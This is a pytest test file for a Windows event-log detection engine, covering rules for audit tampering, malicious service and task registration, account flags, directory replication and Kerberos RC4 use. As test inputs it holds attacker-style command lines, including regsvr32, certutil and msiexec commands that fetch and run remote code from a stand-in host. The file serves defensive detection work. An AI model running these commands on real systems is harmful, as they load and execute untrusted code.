"""Identity review regressions through native Windows envelopes and normalization."""
from dataclasses import replace
from datetime import UTC, datetime, timedelta
from itertools import count

import pytest

from romulus.detect.windows_account_events import (
    AccountRename,
    ComputerAccountConfiguration,
    PrivilegedGroupAddition,
)
from romulus.detect.windows_directory_events import (
    DirectoryReplicationAccess,
    SensitiveDirectoryAttributeChange,
    TrustDirectoryChange,
    WeakKerberosTicketEncryption,
)
from romulus.detect.windows_registration_events import (
    ScheduledTaskRegistration,
    ServiceRegistration,
    WindowsAuditTamper,
)
from romulus.evidence.typed import fv
from romulus.evidence.windows import WindowsNotNormalized, normalize_windows
from romulus.evidence.windows_catalog import (
    EVENTLOG,
    SECURITY,
    SYSMON,
    SYSMON_CHANNEL,
    TASK_CHANNEL,
    TASK_PROVIDER,
)
from romulus.site import COLLECTION_SCHEMA, SiteFacts, validate_site_content
from tests.windows_event_support import run
from tests.windows_fixtures import SHAPES, LogicalWindowsEvent, windows_hit

_ORDINAL = count(1000000)
_START = datetime(2026, 1, 2, 3, tzinfo=UTC)


def native(code, data, *, shape="winlogbeat_8", record=None, host="dc01.example.test", offset=0,
           channel="Security", provider=SECURITY, outcome="success"):
    envelope = windows_hit(LogicalWindowsEvent(channel, provider, code, host, record or next(_ORDINAL),
                                             (_START + timedelta(seconds=offset)).isoformat(), data), shape)
    envelope["_source"].setdefault("event", {})["outcome"] = outcome
    if outcome == "failure":
        envelope["_source"]["winlog"]["keywords"] = ["Audit Failure"]
    return normalize_windows(envelope)


def event(family, code, *, host="ws01", offset=0, native=None, outcome="success", **fields):
    """Translate the older test call sites into native data, never injected typed predicates."""
    names = {
        "account.group_id": "TargetSid", "account.group_name": "TargetUserName", "account.member_id": "MemberSid",
        "account.member_name": "MemberName", "account.name": "TargetUserName", "account.domain": "TargetDomainName",
        "account.old_uac": "OldUacValue", "account.new_uac": "NewUacValue", "account.uac_changes": "UserAccountControl",
        "account.allowed_to_delegate_to": "AllowedToDelegateTo", "account.sid_history": "SidHistory",
        "user.name": "SubjectUserName", "user.domain": "SubjectDomainName", "user.entity_id": "SubjectUserSid",
        "service.image_path": "ServiceFileName" if code == 4697 else "ImagePath", "service.name": "ServiceName",
        "service.type": "ServiceType", "service.start_type": "StartType", "service.account": "AccountName",
        "task.xml": "TaskContent", "task.name": "TaskName", "task.action_name": "ActionName",
        "audit.config.changes": "AuditPolicyChanges", "audit.config.state": "State",
        "directory.object.server": "ObjectServer", "directory.access.access_mask": "AccessMask",
        "directory.rights.names": "Properties",
    }
    data = {}
    for field, value in fields.items():
        key = names.get(field)
        if field.startswith("windows.event_data."):
            key = field.removeprefix("windows.event_data.")
        if key and value is not None:
            data[key] = "\n".join(str(item) for item in value) if isinstance(value, (list, tuple)) else value
    identity = fields.get("auth.target_account")
    if isinstance(identity, str):
        if identity.casefold().startswith("sid:"):
            data["TargetUserSid"] = identity[4:]
        elif identity.casefold().startswith("name:"):
            data["TargetUserName"] = identity[5:]
    xml = data.get("TaskContent")
    if isinstance(xml, str) and "</Task>" in xml:
        if "task.hidden" in fields:
            xml = xml.replace("</Task>", f"<Settings><Hidden>{str(fields['task.hidden']).lower()}</Hidden></Settings></Task>")
        if "task.principal.user_id" in fields:
            xml = xml.replace("</Task>", f"<Principals><Principal><UserId>{fields['task.principal.user_id']}</UserId></Principal></Principals></Task>")
        data["TaskContent"] = xml
    channel, provider = "Security", SECURITY
    if code == 7045:
        channel, provider = "System", "Service Control Manager"
    elif code in {4, 16, 255}:
        channel, provider = SYSMON_CHANNEL, SYSMON
    elif code in {1100, 1102, 1104, 1108}:
        provider = EVENTLOG
    elif code == 104:
        channel, provider = "System", EVENTLOG
    elif code in {106, 140, 200, 141, 129, 201}:
        channel, provider = TASK_CHANNEL, TASK_PROVIDER
    factory = globals()["native"]
    try:
        observation = factory(code, data, host=host, offset=offset, channel=channel, provider=provider, outcome=outcome)
        assert observation.family == family
    except WindowsNotNormalized:
        # Unsupported-code checks exercise the rule fence after a valid native parse.
        observation = factory(4738, data, host=host, offset=offset, outcome=outcome)
        observation.fields["event.code"] = fv(code, "test:unsupported-class")
    if "host.os.family" in fields:
        observation.fields["host.os.family"] = fv(fields["host.os.family"], "test:os-scope")
    return observation


@pytest.mark.parametrize("shape", SHAPES)
@pytest.mark.parametrize("code,data,channel,provider,lane", [
    (1100, {}, "Security", EVENTLOG, "lead"), (1102, {}, "Security", EVENTLOG, "high"),
    (104, {}, "System", EVENTLOG, "high"), (16, {}, SYSMON_CHANNEL, SYSMON, "lead"),
    (4, {"State": "Stopped"}, SYSMON_CHANNEL, SYSMON, "lead"),
    (4719, {"AuditPolicyChanges": "%%8449, %%8451"}, "Security", SECURITY, "lead"),
    (4719, {"AuditPolicyChanges": "%%8448, %%8451"}, "Security", SECURITY, "high"),
    (4719, {"AuditPolicyChanges": "%%8450"}, "Security", SECURITY, "high"),
    (4719, {"AuditPolicyChanges": "%%84480"}, "Security", SECURITY, "lead"),
])
def test_audit_lanes_require_positive_removal(shape, code, data, channel, provider, lane):
    ev = native(code, data, shape=shape, channel=channel, provider=provider)
    match = WindowsAuditTamper().consume([ev])[0]
    assert match.proposed_lane == lane
    assert "no shutdown" not in match.claim.lower()


@pytest.mark.parametrize("shape", SHAPES)
@pytest.mark.parametrize("path", [r"%systemroot%\aBcDeFgH.exe", r"C:\Windows\aBcDeFgH.exe",
                                    r"\\127.0.0.1\ADMIN$\7f1b2c3.exe", r"\\server\share\payload.exe",
                                    r"C:\ProgramData\vendor\payload.exe",
                                    r"rundll32.exe C:\Users\Public\payload.dat,Run",
                                    r"regsvr32.exe /s /i:http://example.test/x.sct scrobj.dll",
                                    r"%COMSPEC% /b /c start /b /min powershell.exe -nop -c Get-Date"])
def test_native_service_default_shapes_are_immediate(shape, path):
    ev = native(7045, {"ServiceName": "changed", "ImagePath": path, "ServiceType": "user mode service"},
                shape=shape, channel="System", provider="Service Control Manager")
    match = ServiceRegistration().consume([ev])[0]
    assert match.proposed_lane == "high"
    if "COMSPEC" in path:
        assert "PowerShell host" in match.claim


@pytest.mark.parametrize("service_type,lane", [("kernel mode driver", "lead"), ("1", "lead"),
                                               ("16", "high"), (None, "lead")])
def test_writable_service_requires_user_mode_or_a_second_signal(service_type, lane):
    data = {"ServiceName": "vendor", "ImagePath": r"C:\Users\Public\Temp\driver.sys"}
    if service_type is not None:
        data["ServiceType"] = service_type
    assert ServiceRegistration().judge(native(7045, data, channel="System", provider="Service Control Manager"))[0].lane == lane


@pytest.mark.parametrize("shape", SHAPES)
@pytest.mark.parametrize("command,args", [("rundll32.exe", r"C:\Users\Public\x.dat,Entry"),
                                          ("regsvr32.exe", "/s /i:https://example.test/a scrobj.dll"),
                                          ("certutil.exe", "-urlcache https://example.test/a a"),
                                          ("msiexec.exe", "/i https://example.test/a.msi"),
                                          (r"C:\ProgramData\x.exe", "")])
def test_native_task_default_shapes_surface(shape, command, args):
    xml = f"<Task><Actions><Exec><Command>{command}</Command><Arguments>{args}</Arguments></Exec></Actions></Task>"
    ev = native(4698, {"TaskName": "\\Update", "TaskContent": xml}, shape=shape)
    assert ScheduledTaskRegistration().consume([ev])


def test_com_handler_and_missing_task_content_are_leads():
    xml = "<Task><Actions><ComHandler><ClassId>{11111111-2222-3333-4444-555555555555}</ClassId></ComHandler></Actions></Task>"
    hit = ScheduledTaskRegistration().judge(native(4698, {"TaskName": "\\Update", "TaskContent": xml}))[0]
    assert hit.lane == "lead" and "COM handler" in hit.text
    for code in (106, 140):
        hit = ScheduledTaskRegistration().judge(native(code, {"TaskName": "\\Update"}, channel=TASK_CHANNEL, provider=TASK_PROVIDER))[0]
        assert "no action content in this record" in hit.text and hit.lane == "lead"


def test_action_name_is_a_path_and_never_an_ambiguous_command_line():
    ev = native(200, {"TaskName": "\\Acme", "ActionName": r"C:\Program Files\Acme Corp\agent.exe"},
                channel=TASK_CHANNEL, provider=TASK_PROVIDER)
    assert ScheduledTaskRegistration().judge(ev) == []


@pytest.mark.parametrize("shape", SHAPES)
@pytest.mark.parametrize("code", [4738, 4742])
@pytest.mark.parametrize("token,word", [("%%2096", "preauthentication exemption"), ("%%2093", "trusted-for-delegation"),
                                       ("%%2098", "protocol-transition delegation")])
def test_sensitive_user_and_computer_flags(shape, code, token, word):
    ev = native(code, {"TargetSid": "S-1-5-21-1-2-3-1200", "UserAccountControl": token}, shape=shape)
    match = ComputerAccountConfiguration().consume([ev])[0]
    assert match.proposed_lane == "high" and word in match.claim
    assert ("User-account" if code == 4738 else "Computer-account") in match.claim


@pytest.mark.parametrize("token", ["%%2048", "%%2080"])
def test_ordinary_enable_disable_flags_are_recognized(token):
    assert ComputerAccountConfiguration().judge(native(4742, {"UserAccountControl": token})) == []


@pytest.mark.parametrize("shape", SHAPES)
@pytest.mark.parametrize("attribute,dn,matched", [
    ("msDS-AllowedToActOnBehalfOfOtherIdentity", "CN=Host,DC=example,DC=test", True),
    ("msDS-KeyCredentialLink", "CN=User,DC=example,DC=test", True),
    ("servicePrincipalName", "CN=User,DC=example,DC=test", True),
    ("nTSecurityDescriptor", "DC=example,DC=test", True),
    ("nTSecurityDescriptor", "CN=User,DC=example,DC=test", False),
    ("description", "DC=example,DC=test", False),
    ("msDS-KeyCredentialLinkExtra", "CN=User,DC=example,DC=test", False),
])
def test_exact_sensitive_directory_attributes(shape, attribute, dn, matched):
    ev = native(5136, {"ObjectDN": dn, "AttributeLDAPDisplayName": attribute, "AttributeValue": "recorded"}, shape=shape)
    matches = SensitiveDirectoryAttributeChange().consume([ev])
    assert bool(matches) is matched
    if matched:
        assert matches[0].proposed_lane == "lead"


@pytest.mark.parametrize("group,name,lane", [("S-1-5-32-555", "Remote Desktop Users", "lead"),
                                            ("S-1-5-32-580", "Remote Management Users", "lead"),
                                            ("S-1-5-21-1-2-3-517", "Cert Publishers", "lead"),
                                            ("S-1-5-32-578", "Hyper-V Administrators", "high"),
                                            ("S-1-5-21-1-2-3-498", "Enterprise RODC", "high"),
                                            ("S-1-5-32-562", "Distributed COM Users", "lead"),
                                            ("S-1-5-21-1-2-3-1100", "DnsAdmins", "lead"),
                                            ("S-1-5-21-1-2-3-1101", "Exchange Windows Permissions", "lead")])
def test_sensitive_group_roles_and_name_only_leads(group, name, lane):
    ev = native(4732, {"TargetSid": group, "TargetUserName": name, "MemberSid": "S-1-5-21-1-2-3-1200"})
    assert PrivilegedGroupAddition().consume([ev])[0].proposed_lane == lane


FACTS = SiteFacts(True, "test", {"directory_sync_accounts": [], "directory_sync_accounts_declared": True}, (), ("dc01.example.test",), ())
REPLICATION = {"SubjectUserName": "operator", "SubjectDomainName": "EXAMPLE", "ObjectServer": "DS",
               "ObjectName": "DC=example,DC=test", "AccessMask": "0x100",
               "Properties": "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"}


@pytest.mark.parametrize("domain,name,lane", [("EXAMPLE", "operator", "high"), ("EXAMPLE", "DC01$", "lead"),
                                              ("EVIL", "DC01$", "lead"), ("evil.test", "DC01$", "high"),
                                              (None, "DC01$", "lead")])
def test_declared_empty_sync_list_is_configured_and_dc_domain_matters(domain, name, lane):
    data = {**REPLICATION, "SubjectUserName": name}
    if domain:
        data["SubjectDomainName"] = domain
    else:
        data.pop("SubjectDomainName")
    rule = DirectoryReplicationAccess()
    rule.site_facts = validate_site_content({"schema": COLLECTION_SCHEMA, "domain_controllers": ["dc01.example.test"],
                                             "directory_sync_accounts": [], "directory_sync_accounts_declared": True})
    hit = rule.judge(native(4662, data))[0]
    assert hit.lane == lane and "not configured" not in " ".join(hit.notes)


def test_sync_names_require_exact_domain_without_guessing_aliases():
    rule = DirectoryReplicationAccess()
    rule.site_facts = replace(FACTS, directory_sync_accounts=(r"name:example.test\operator",))
    assert rule.judge(native(4662, REPLICATION))[0].lane == "high"
    assert rule.judge(native(4662, {**REPLICATION, "SubjectDomainName": "example.test"}))[0].lane == "lead"


@pytest.mark.parametrize("shape", SHAPES)
def test_account_rename_uses_native_old_and_new_names(shape):
    ev = native(4781, {"OldTargetUserName": "old", "NewTargetUserName": "new", "TargetSid": "S-1-5-21-1-2-3-1200"}, shape=shape)
    match = AccountRename().consume([ev])[0]
    assert "old to new" in match.claim and match.proposed_lane == "lead"


@pytest.mark.parametrize("shape", SHAPES)
@pytest.mark.parametrize("code", [4706, 4716])
def test_native_trust_changes(shape, code):
    ev = native(code, {"DomainName": "partner.test", "DomainSid": "S-1-5-21-4-5-6", "TdoType": "2",
                       "TdoDirection": "3", "TdoAttributes": "32"}, shape=shape)
    match = TrustDirectoryChange().consume([ev])[0]
    assert match.proposed_lane == "lead"
    assert any(item.field == "directory.trust.direction" and item.value == 3 for item in match.predicate)


def test_rc4_repeated_content_folds_but_different_content_remains_distinct():
    data = {"TargetUserName": "analyst", "TargetDomainName": "EXAMPLE", "ServiceName": "svc_database",
            "TicketEncryptionType": "0x17", "IpAddress": "192.0.2.9", "Status": "0"}
    rule = WeakKerberosTicketEncryption()
    rows = [native(4769, {**data, "LogonGuid": f"{{00000000-0000-0000-0000-{i:012x}}}"}, offset=i) for i in range(1, 25)]
    rows.append(native(4769, {**data, "TicketEncryptionType": "0x18"}, offset=25))
    matches = run(rule, rows)
    assert len(rule.groups) == 2
    assert len(matches) <= 3
    assert any("24 Windows event record(s)" in match.claim for match in matches)


def test_shutdown_context_is_positive_cited_and_spills_without_loss():
    rule = WindowsAuditTamper()
    rule.shutdowns.hot_size = 2
    shutdowns = [native(1100, {}, host=f"ws{i}.example.test", provider=EVENTLOG) for i in range(25)]
    observations = {row.id: row for row in shutdowns}
    rule.load = lambda ids: [observations[key] for key in ids if key in observations]
    for shutdown in shutdowns:
        rule.consume([shutdown])
        rule.drain_staged()
    assert rule.shutdowns.on_disk > 0 and len(rule.shutdowns.hot) <= 2
    stopped = native(4, {"State": "Stopped"}, channel=SYSMON_CHANNEL, provider=SYSMON, host="ws0.example.test", offset=1)
    match = rule.consume([stopped])[0]
    assert match.proposed_lane == "lead" and "also contain" in match.claim
    assert shutdowns[0] in match.events and shutdowns[0].id in match.context_ids
    other = native(4, {"State": "Stopped"}, channel=SYSMON_CHANNEL, provider=SYSMON, host="other.example.test", offset=1)
    assert "context is unresolved" in rule.consume([other])[0].claim
    rule.release_state()


def test_shutdown_context_preserves_native_raw_copy_across_batches():
    envelope = windows_hit(LogicalWindowsEvent("Security", EVENTLOG, 1100, "ws01.example.test", 12345,
                                              _START.isoformat(), {}), "winlogbeat_8")
    shutdown = normalize_windows(envelope)
    rule = WindowsAuditTamper()
    rule.bind_raw({shutdown.raw[0].key: envelope["_source"]})
    rule.consume([shutdown])
    rule.drain_staged()
    rule.bind_raw({})
    stopped = native(4, {"State": "Stopped"}, host="ws01.example.test", channel=SYSMON_CHANNEL, provider=SYSMON, offset=1)
    match = rule.consume([stopped])[0]
    assert match.raw_copies[shutdown.raw[0].key] == envelope["_source"]
    assert shutdown.id in match.context_ids
    rule.release_state()


def test_fleet_stopping_claim_does_not_generalize_individual_shutdown_context():
    shutdown = native(1100, {}, provider=EVENTLOG)
    stopped = [native(4, {"State": "Stopped"}, channel=SYSMON_CHANNEL, provider=SYSMON, offset=i) for i in (1, 2)]
    matches = run(WindowsAuditTamper(), [shutdown, *stopped])
    fleet = [match for match in matches if match.group_key]
    assert len(fleet) == 1 and "also contain" not in fleet[0].claim
    assert any(shutdown.id in match.context_ids for match in matches)


def test_rc4_shape_spill_keeps_exact_repeats_and_new_content_immediate():
    rule = WeakKerberosTicketEncryption()
    for store in rule._owned_stores():
        store.hot_size = 2
    data = {"TargetUserName": "analyst", "TargetDomainName": "EXAMPLE", "ServiceName": "svc_database",
            "TicketEncryptionType": "0x17", "IpAddress": "192.0.2.9", "Status": "0"}
    rows = [native(4769, {**data, "ServiceName": f"svc_{index}"}, offset=index) for index in range(30)]
    rows.append(native(4769, {**data, "ServiceName": "svc_0", "LogonGuid": "{12345678-1111-2222-3333-444455556666}"}, offset=31))
    by_id = {row.id: row for row in rows}
    rule.load = lambda ids: [by_id[key] for key in ids if key in by_id]
    for row in rows:
        assert rule.consume([row])
        rule.drain_staged()
    assert len(rule.groups) == 30 and rule.groups.on_disk > 0 and len(rule.groups.hot) <= 2
    assert any("2 Windows event record(s)" in match.claim for match in rule.finalize())
    rule.release_state()


def test_cmd_echo_argument_mentions_do_not_become_an_inner_powershell_host():
    ev = native(7045, {"ServiceName": "echo", "ImagePath": "cmd.exe /c echo powershell.exe -enc AAAA"},
                channel="System", provider="Service Control Manager")
    hit = ServiceRegistration().judge(ev)[0]
    assert "PowerShell host" not in hit.text and "PowerShell encoded-command" not in hit.text


def test_service_and_task_repeats_exclude_instance_identifiers_from_fleet_shapes():
    services = [native(7045, {"ServiceName": "update", "ImagePath": "cmd.exe /c Get-Date", "ServiceType": "16",
                              "ProcessID": str(100 + i), "SubjectLogonId": hex(i)}, channel="System",
                       provider="Service Control Manager", offset=i) for i in range(1, 20)]
    service_rule = ServiceRegistration()
    service_matches = run(service_rule, services)
    assert len(service_rule.groups) == 1 and len(service_matches) <= 2
    tasks = [native(106, {"TaskName": "\\Update", "TaskInstanceId": f"{{00000000-0000-0000-0000-{i:012x}}}",
                         "ProcessID": str(100 + i)}, channel=TASK_CHANNEL, provider=TASK_PROVIDER, offset=i)
             for i in range(1, 20)]
    task_rule = ScheduledTaskRegistration()
    task_matches = run(task_rule, tasks)
    assert len(task_rule.groups) == 1 and len(task_matches) <= 2


@pytest.mark.parametrize("rule_type,code,data,changed", [
    (PrivilegedGroupAddition, 4732, {"TargetSid": "S-1-5-32-544", "MemberSid": "S-1-5-21-1-2-3-1200"},
     {"MemberSid": "S-1-5-21-1-2-3-1201"}),
    (SensitiveDirectoryAttributeChange, 5136,
     {"ObjectDN": "CN=User,DC=example,DC=test", "AttributeLDAPDisplayName": "servicePrincipalName", "AttributeValue": "http/one"},
     {"AttributeValue": "http/two"}),
    (DirectoryReplicationAccess, 4662, REPLICATION, {"AccessMask": "0x10100"}),
    (WindowsAuditTamper, 4719, {"AuditPolicyChanges": "%%8448"}, {"AuditPolicyChanges": "%%8450"}),
])
def test_identity_families_fold_new_instances_but_preserve_distinct_behavior(rule_type, code, data, changed):
    rule = rule_type()
    if isinstance(rule, DirectoryReplicationAccess):
        rule.site_facts = FACTS
    rows = [native(code, {**data, "SubjectLogonId": hex(i),
                          "OpCorrelationID": f"{{00000000-0000-0000-0000-{i:012x}}}"}, offset=i) for i in range(1, 25)]
    rows.append(native(code, {**data, **changed}, offset=25))
    matches = run(rule, rows)
    assert len(rule.groups) == 2 and len(matches) <= 3
    assert any("24 Windows event record(s)" in match.claim for match in matches)


def test_task_registration_and_update_keep_distinct_recorded_actions():
    xml = "<Task><Actions><Exec><Command>cmd.exe</Command><Arguments>/c Get-Date</Arguments></Exec></Actions></Task>"
    rows = [native(code, {"TaskName": "\\Update", "TaskContent": xml}, offset=code) for code in (4698, 4702)]
    rule = ScheduledTaskRegistration()
    assert len(run(rule, rows)) == 2 and len(rule.groups) == 2
